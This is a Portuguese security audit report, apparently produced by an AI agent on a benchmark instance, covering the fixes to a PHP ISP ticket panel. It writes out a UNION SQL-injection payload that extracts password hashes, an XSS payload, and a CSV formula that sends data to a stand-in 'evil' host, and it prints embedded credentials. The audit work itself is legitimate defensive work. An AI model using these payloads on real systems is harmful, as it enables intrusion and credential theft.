# RELATÓRIO TÉCNICO — Painel de Chamados (NetX ISP)

**Instância:** LEB-100-A · **Modo:** A (agêntico)

## 1. Resumo

O sistema é um painel de chamados em PHP/mysqli com três arquivos efetivos (`config.php`, `lib.php`, `index.php`). A funcionalidade básica (login, listagem, busca, detalhe, export CSV) opera, mas o código foi caracterizado **em execução** (MariaDB 11.8 + PHP 8.4, banco de teste com `schema.sql`/`seed.sql`) e apresenta: **injeção de SQL explorável** na busca (demonstrada extraindo os hashes de senha de todos os usuários via `UNION`), **ausência total da regra de visibilidade** declarada no manifesto (clientes veem e exportam chamados de outros clientes), **XSS refletido** no parâmetro `busca`, um **erro fatal (HTTP 500)** quando nenhum chamado tem primeira resposta, além de credencial embutida em fonte, corrida no export CSV, N+1 consultas e fragilidades de sessão. Corrigi o que tinha impacto direto e risco de correção controlado; documentei o que deliberadamente não toquei (MD5, fallback de senha do banco, sanitização de fórmulas no CSV, CSRF do login) — sempre por compatibilidade ou custo/benefício.

Metodologia: caracterizei o comportamento original antes de alterar (login como cliente/técnico, listagem, detalhe, busca, export, estado de banco vazio), apliquei as correções in-place e re-executei a mesma bateria, mais testes de ataque. O CSV exportado por um técnico é **byte-idêntico** ao baseline; a listagem de um técnico continua mostrando os 5 chamados; a API pública de `lib.php` (assinaturas e retornos) foi verificada por chamada direta.

## 2. Achados (em ordem de prioridade de correção)

### F1 — Injeção de SQL na busca de `listarChamados` · **crítica** · confiança **100** · corrigido

- **Onde:** `code/lib.php:82` (original) — `$sql .= " WHERE titulo LIKE '%" . $busca . "%'"`.
- **Mecanismo:** `$_GET['busca']` entra em `listarChamados` como `string` sem qualquer escape e é concatenada dentro do `LIKE`. A aspa simples do payload fecha a string SQL e o restante é interpretado como código: `busca=x' UNION SELECT ...` reescreve a consulta inteira.
- **Impacto (demonstrado):** com `busca=%' OR 1=1 -- ` a listagem devolve todos os chamados; com `busca=x' UNION SELECT NULL,NULL,NULL,CONCAT(login,':',senha),NULL,NULL,NULL,NULL,NULL FROM usuarios -- ` a página renderizou os quatro logins com seus hashes MD5 (`ana:e7d80ffe...`, `carla:2b21aaa0...`, etc.). Qualquer cliente autenticado (ou anyone que obtenha sessão) lê a tabela `usuarios` inteira e quaisquer outros dados do banco acessíveis ao usuário `painel`.
- **Correção:** `LIKE CONCAT('%', ?, '%')` com `prepared statement` e `bind_param('s', $busca)` (lib.php:86-95). Wildcards `%`/`_` continuam funcionando como antes (comportamento de busca preservado — verificado).
- **Verificação pós-fix:** os mesmos payloads agora retornam lista vazia, sem erro e sem vazamento; busca normal (`Roteador` → 105) e wildcard (`%` → todos) preservados.

### F2 — Regra de visibilidade do manifesto não implementada · **crítica** · confiança **100** · corrigido

- **Onde:** `code/index.php:44-73` (original) — as três rotas (`export=csv`, `ver`, listagem) usam os dados sem consultar `$papel`, que é lido na linha 39 e **nunca usado**.
- **Mecanismo:** o manifesto declara que "um cliente só pode ver os chamados que ele mesmo abriu; um técnico pode ver qualquer chamado", mas nenhuma das rotas filtra por `usuario_id`/papel. `listarChamados` devolve a tabela inteira, `verChamado` abre qualquer id e `exportarCsv` exporta tudo para quem estiver logado.
- **Impacto (demonstrado):** `ana` (cliente) listava os 5 chamados, abria `?ver=103` (chamado do `bruno`, com descrição) e baixava o CSV completo com dados de todos os clientes do ISP. Vazamento de dados entre clientes (LGPD-relevante) e quebra do contrato declarado.
- **Correção:**
  - Rota `ver` (index.php:60): cliente só vê chamado com `usuario_id == uid`; caso contrário recebe a mesma mensagem "Chamado nao encontrado." do id inexistente (não revela existência — evita enumeração).
  - Listagem (index.php:79-83): para `$papel !== 'tecnico'`, filtra em PHP o resultado de `listarChamados` (a assinatura pública da função, congelada pelo manifesto, não ganhou parâmetros).
  - Export (lib.php:143-146): dentro de `exportarCsv`, se a sessão ativa for de cliente, exporta apenas `usuario_id = uid`. Consumidores externos (rotina noturna/faturamento) rodam **sem sessão** e recebem o export completo, como antes.
- **Verificação pós-fix:** ana → 101,102,105; bruno → 103,104; carla (técnica) → todos os 5; `?ver=103` como ana → "não encontrado"; CSV da ana só tem 3 linhas; CSV da carla byte-idêntico ao baseline; CLI sem sessão exporta os 5.

### F3 — XSS refletido no parâmetro `busca` · **alta** · confiança **100** · corrigido

- **Onde:** `code/index.php:79` (valor do input) e `:82` ("Resultados para") — originais.
- **Mecanismo:** `$_GET['busca']` é ecoado duas vezes sem `htmlspecialchars`. O payload `"><script>alert(1)</script>` fecha o atributo `value` e injeta marcação executável; o mesmo vale para o parágrafo de resultados (contexto de corpo).
- **Impacto (demonstrado):** o HTML entregue continha `value=""><script>alert(1)</script>"` — execução de script no navegador de quem clicar num link forjado, com acesso à sessão da vítima (antes da correção, sem `HttpOnly`, o cookie era acessível ao script).
- **Correção:** `htmlspecialchars($busca, ENT_QUOTES, 'UTF-8')` nos dois pontos (index.php:85, 90, 93).
- **Verificação pós-fix:** o payload volta como `&quot;&gt;&lt;script&gt;...` — texto inerte.

### F4 — Chave de API SMTP embutida no fonte · **alta** · confiança **95** · corrigido

- **Onde:** `code/config.php:15` — `define('SMTP_API_KEY', 'netx-smtp-9f83e2c1a7b64d05')`.
- **Mecanismo:** credencial de serviço de e-mail transacional gravada em texto plano no repositório. Qualquer pessoa com acesso ao código (backup, clone, despejo acidental) obtém a chave; não há rotação possível sem deploy.
- **Impacto:** envio de e-mails em nome do ISP (phishing interno, exaustão de cota). A constante não é usada por `code/`, mas é incluída por `config.php` em qualquer script que o requisite.
- **Correção:** `define('SMTP_API_KEY', getenv('SMTP_API_KEY') ?: '')` (config.php:15) — a constante continua definida (scripts externos que testam `defined()` não quebram), o valor passa a vir do ambiente/secret manager.

### F5 — Divisão por zero em `mediaResposta` derruba a página · **alta** · confiança **100** · corrigido

- **Onde:** `code/lib.php:116` (original) — `return $soma / $qtd;`.
- **Mecanismo:** quando nenhum chamado tem `minutos_resposta` (banco novo, ou todos os chamados aguardando 1ª resposta), o `while` não roda e `$qtd` fica 0. Em PHP 8, divisão inteira por zero lança `DivisionByZeroError` — erro fatal, não exceção capturável por `catch` comum.
- **Impacto (demonstrado):** com `UPDATE chamados SET minutos_resposta = NULL`, a listagem devolveu **HTTP 500** — a tela principal do painel cai inteira, para todos os papéis, até existir uma resposta.
- **Correção:** `return $qtd > 0 ? $soma / $qtd : 0.0;` (lib.php:130). O caminho normal continua idêntico (25.666… verificado).
- **Verificação pós-fix:** mesmo estado de banco → HTTP 200 com "0 min".

### F6 — `exportarCsv` usa caminho fixo compartilhado e deixa o arquivo no disco · **média** · confiança **85** · corrigido

- **Onde:** `code/lib.php:125` (original) — `EXPORT_DIR . '/chamados.csv'`.
- **Mecanismo:** dois requests simultâneos escrevem **no mesmo arquivo** (`fopen(..., 'w')` trunca): o CSV de um usuário pode ser truncado/sobreposto pelo outro no meio do `readfile`, entregando conteúdo misto ou incompleto. Além disso o arquivo **permanece** em `/var/www/painel/tmp/chamados.csv` com dados de todos os chamados — se o docroot do vhost for `/var/www/painel`, `GET /tmp/chamados.csv` baixa o export completo **sem autenticação** (o nome é fixo e adivinhável).
- **Impacto:** CSV corrompido entregue à integração de faturamento sob concorrência; exposição não autenticada dos dados (confirmado que o arquivo persistia após o download no baseline: `chamados.csv` permanecia em `EXPORT_DIR`).
- **Correção:** arquivo temporário **único por request** via `tempnam()` em `EXPORT_DIR` (com fallback para o temp do sistema se o diretório não existir/não for gravável — antes era falha silenciosa), `readfile` e `unlink` imediato (lib.php:148-157, 194-195). `tempnam` cria o arquivo com modo 0600, legível apenas pelo processo. Conteúdo e headers do CSV intactos.
- **Verificação pós-fix:** zero arquivos residuais após export; CSV byte-idêntico ao baseline para técnico; funciona até sem `EXPORT_DIR` existente (fallback).

### F7 — Sessão sem endurecimento (fixação e cookie) · **média** · confiança **85** · corrigido

- **Onde:** `code/index.php:15` e `:20-29` (originais) — `session_start()` puro; login sem `session_regenerate_id`.
- **Mecanismo:** o `PHPSESSID` aceito no login é o mesmo fixado antes dele (fixação de sessão: um atacante que plante um id conhecido no navegador da vítima herda a sessão autenticada). O cookie ia sem `HttpOnly` nem `SameSite` — combinado com o F3, `document.cookie` entregava a sessão a um script injetado.
- **Correção:** `session_regenerate_id(true)` no sucesso do login (index.php:28) e `session_set_cookie_params(['httponly' => true, 'samesite' => 'Lax'])` antes do `session_start()` (index.php:15-18). **Não** fixei `secure` => o painel pode ser servido por HTTP simples no provedor; quebrar o login em produção seria pior que a ausência da flag (ver Decisões).
- **Verificação pós-fix:** `Set-Cookie: PHPSESSID=...; path=/; HttpOnly; SameSite=Lax`.

### F8 — N+1 consultas na listagem · **média** (performance) · confiança **100** · corrigido

- **Onde:** `code/lib.php:88-91` (original) — o laço de `listarChamados` chama `tecnicoNome` por linha, e `tecnicoNome` executa um `SELECT` próprio.
- **Mecanismo:** cada chamado listado dispara uma consulta adicional à `usuarios`. Com C chamados são C+1 round-trips ao banco; a página de listagem do ISP degrada linearmente com o volume (e o export tinha o mesmo padrão).
- **Correção:** `LEFT JOIN usuarios u ON u.id = c.tecnico_id` com `COALESCE(u.nome, '-') AS tecnico_nome` em `listarChamados` (lib.php:83-85) e em `exportarCsv` (lib.php:160-162) — 1 consulta por tela. O valor de `tecnico_nome` é idêntico ao antigo (`'-'` para sem técnico ou técnico inexistente — verificado contra baseline). `tecnicoNome()` foi mantida como função (ver Decisões).
- **Verificação pós-fix:** saída da listagem igual à do baseline (nomes, `'-'` no chamado 104); chaves do array retornado idênticas (`...criado_em, tecnico_nome`).

### F9 — SQL montado por concatenação em `verChamado`/`tecnicoNome` · **baixa** · confiança **90** · corrigido

- **Onde:** `code/lib.php:100` e `:69` (originais) — `... WHERE id = ' . $id`.
- **Mecanismo:** os parâmetros são `int`/`?int` type-hinted, então hoje a concatenação não é explorável (o PHP recusa/cerceia não numéricos) — por isso severidade baixa. Mas o padrão é uma refatoração distante de uma segunda F1: qualquer chamada futura que relaxe o tipo reabre injeção. É o mesmo mecanismo do F1 sem a proteção do F1.
- **Correção:** `prepared statement` com `bind_param('i', ...)` em ambas (lib.php:70-74, 112-115). Defesa em profundidade, custo zero.
- **Verificação pós-fix:** `verChamado($db,104)` e `tecnicoNome($db,3)` retornam o esperado; `?ver=abc` → "não encontrado".

### F10 — Senhas com MD5 sem salt · **alta** · confiança **100** · reportado, não corrigido

- **Onde:** `code/lib.php:15` (`$hash = md5($senha)`), `code/schema.sql:7` (`CHAR(32)`), `code/seed.sql`.
- **Mecanismo:** MD5 é quebrável por rainbow table/dicionário em segundos; sem salt, senhas iguais geram hash igual (visível na exfiltração do F1: `ana` e `bruno` compartilhavam `e7d80ffe...`). O F1 já entregou os hashes — a proteção restante é só a força da senha.
- **Por que não corrigi:** trocar para `password_hash()` exige migrar a coluna `CHAR(32)` (DDL), rehash de todos os usuários em produção e um fluxo de redefinição — muda o schema e o comportamento de `autenticar` para os dados existentes; o manifesto proíbe quebrar o que consumidores usam e o escopo era evoluir, não reprojetar. Registrei como dívida prioritária: `password_verify` com rehash-on-login é o caminho, em janela dedicada.

### F11 — Senha de banco de produção embutida como fallback · **alta** · confiança **90** · reportado, não corrigido

- **Onde:** `code/config.php:12` — `define('DB_PASS', getenv('DB_PASS') ?: 'N3tX@2013!prod')`.
- **Mecanismo:** a credencial real do banco de produção está no fonte; qualquer vazamento do repositório expõe o banco. Diferente da chave SMTP (F4), **este fallback é funcional**: é plausível que o provisionamento atual do ISP dependa dele para conectar.
- **Por que não corrigi:** removê-lo pode derrubar a conexão em ambientes que não injetam `DB_PASS` — risco de indisponibilidade maior que o ganho imediato (a senha já está comprometida de qualquer forma; o gesto correto é **rotacioná-la** em operação e então exigir a env var). Ver também a correção simétrica que apliquei no F4, onde o risco não existia.

### F12 — Injeção de fórmula (CSV) no export · **média** · confiança **70** · reportado, não corrigido

- **Onde:** `code/lib.php:136-145` (original) — `fputcsv` escreve `titulo` cru.
- **Mecanismo:** célula iniciada em `=`, `+`, `-` ou `@` é interpretada como fórmula ao abrir o CSV no Excel/LibreOffice da integração de faturamento. Um título de chamado como `=HYPERLINK("http://evil/?"&A2,"clique")` executaria no cliente do ISP.
- **Por que não corrigi:** a mitigação padrão (prefixar `'`) **altera o conteúdo exato das células** — e o manifesto congela o formato do CSV consumido pela integração de faturamento. Sem especificação dizendo que o consumidor sanitiza, mudar o dado é risco de compatibilidade maior que a ameaça (os títulos hoje vêm de canal interno). Recomendo sanitizar no consumidor final.

### F13 — Login sem proteção CSRF · **baixa** · confiança **60** · reportado, não corrigido

- **Onde:** `code/index.php:21-34` (original) — formulário POST sem token.
- **Mecanismo:** um site externo pode POSTar credenciais para `index.php` em nome de um visitante (login CSRF — autenticar a vítima na conta do atacante) — impacto limitado neste painel.
- **Por que não corrigi:** adicionar token muda o formulário e introduz estado extra num fluxo que o manifesto não descreve; o SameSite=Lax do F7 já bloqueia o POST cross-site nos navegadores modernos, que era o vetor principal. Custo/benefício desfavorável agora.

## 3. Decisões — o que NÃO mudei, e por quê

| O que | Por quê |
| --- | --- |
| **MD5 em `autenticar`/schema (F10)** | Exige migração de dados + DDL + rehash; fora do escopo "evolua, não reescreva"; risco de quebrar login em produção. Dívida #1 registrada. |
| **Fallback de `DB_PASS` (F11)** | Funcionalmente load-bearing: ambientes sem a env var dependem dele para conectar. A ação real é rotação operacional da senha, não edição de fonte. |
| **Sanitização de fórmula no CSV (F12)** | Mudaria o conteúdo exato das células; o formato do CSV é contrato do manifesto (integração de faturamento). |
| **CSRF no login (F13)** | SameSite=Lax (F7) cobre o vetor prático; token adicionaria estado a um formulário fora do contrato. |
| **Wildcards `%`/`_` na busca** | Comportamento existente (pré-correção) de LIKE; escapá-los mudaria resultados de buscas legadas/favoritos. Mantive a semântica, eliminei só a injeção. |
| **`formatarStatus` devolve "Resolvido" para status fora de 1–3** | O manifesto fixa o mapeamento 1/2/3 e o relatório gerencial casa por esses textos; endurecer o default poderia alterar saída que consumidor depende. |
| **Função `tecnicoNome` mantida** | Não está no manifesto, mas o comentário original dizia "usado na listagem e no export" — pode haver chamador externo. Só troquei a implementação interna por JOIN; a função segue disponível e corrigida. |
| **`EXPORT_DIR = /var/www/painel/tmp`** | Caminho de produção em uso; mudei o *uso* (arquivo único + unlink + fallback), não a configuração. |
| **`secure => true` no cookie de sessão** | Painel pode ser servido sobre HTTP no provedor; ativar sem garantir HTTPS quebraria todo login. Deixei pronto para ligar quando houver TLS. |
| **Stack, assinaturas, rotas, nomes e caminhos** | Congelados pelo manifesto (`mysqli`, `busca`/`ver`/`export`, header do CSV, `id="tabela-chamados"`, ordem de colunas). Nada foi renomeado ou movido. |

## 4. Compatibilidade verificada (caracterização antes × depois)

Executada contra MariaDB 11.8 + PHP 8.4 com `schema.sql` + `seed.sql`:

- Login `ana`/`bruno` (clientes) e `carla` (técnica) funcionam com as credenciais do manifesto.
- Técnico: listagem com 5 chamados, detalhe de qualquer um, CSV completo **byte-idêntico** ao original (`ID,Titulo,Status,Tecnico,"Aberto em"` + 5 linhas por `id` crescente, rótulos exatos de `formatarStatus`, `-` para chamado sem técnico).
- Cliente: agora vê/exporta **apenas** os próprios (a única mudança intencional, exigida pela regra de visibilidade do manifesto).
- `?busca=` com termo normal, vazio e com `%`/`'` — resultados e HTTP 200 preservados.
- `?ver=<inexistente>` e `?ver=abc` → mesma tela "Chamado nao encontrado.".
- `mediaResposta`: 25.666… (igual); estado vazio → 200 com "0 min" (antes: 500).
- Chamada direta das funções públicas de `lib.php` (assinaturas/retornos conforme manifesto): `autenticar`, `formatarStatus` (1/2/3 → textos exatos), `rotuloPrioridade` (todos os rótulos), `listarChamados` (chaves + `tecnico_nome`), `verChamado`, `mediaResposta`, `exportarCsv` (CLI sem sessão → export completo).
- Ataques re-executados pós-fix: SQLi (`OR 1=1`, `UNION`) → sem vazamento/erro; XSS → escapado; export concorrente → sem arquivo residual.

**Arquivos alterados:** `code/lib.php` (F1, F5, F6, F8, F9 + filtro do F2 no export), `code/index.php` (F2, F3, F7), `code/config.php` (F4). `schema.sql` e `seed.sql` intactos.
